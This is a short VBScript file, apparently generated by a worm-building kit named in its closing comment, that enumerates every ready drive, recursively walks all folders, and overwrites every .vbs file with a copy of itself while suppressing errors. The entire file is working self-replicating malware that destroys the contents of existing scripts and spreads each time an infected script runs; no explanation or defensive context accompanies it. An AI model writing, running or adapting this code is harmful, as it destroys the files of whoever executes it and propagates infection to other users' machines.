set mvbswe = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then
fso.Copyfile Wscript.Scriptfullname,file.path
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next
end function
'Generated with Microsoft Visual Basic Script Worm Editor [MVBSWE]